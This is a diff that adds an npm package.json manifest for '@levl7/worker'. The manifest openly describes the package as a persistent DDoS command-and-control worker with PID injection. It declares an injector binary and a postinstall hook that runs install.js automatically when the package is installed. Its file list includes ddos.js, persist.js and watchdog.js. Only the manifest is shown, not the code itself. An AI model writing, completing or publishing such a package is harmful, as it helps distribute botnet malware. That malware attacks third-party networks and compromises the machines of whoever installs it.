@@ -1,0 +1,32 @@
+{
+  "name": "@levl7/worker",
+  "version": "2.0.0",
+  "description": "LevL7 CNC Worker Agent - persistent DDoS worker with PID injection",
+  "main": "index.js",
+  "bin": {
+    "levl7-worker": "./index.js",
+    "levl7-inject": "./inject.js"
+  },
+  "scripts": {
+    "start": "node index.js",
+    "inject": "node inject.js",
+    "postinstall": "node install.js"
+  },
+  "keywords": ["levl7", "worker", "ddos", "cnc", "agent", "injector"],
+  "license": "UNLICENSED",
+  "private": false,
+  "dependencies": {
+    "axios": "^1.9.0"
+  },
+  "files": [
+    "index.js",
+    "inject.js",
+    "install.js",
+    "ddos.js",
+    "persist.js",
+    "watchdog.js",
+    "master.json",
+    "ddos/",
+    "README.md"
+  ]
+}
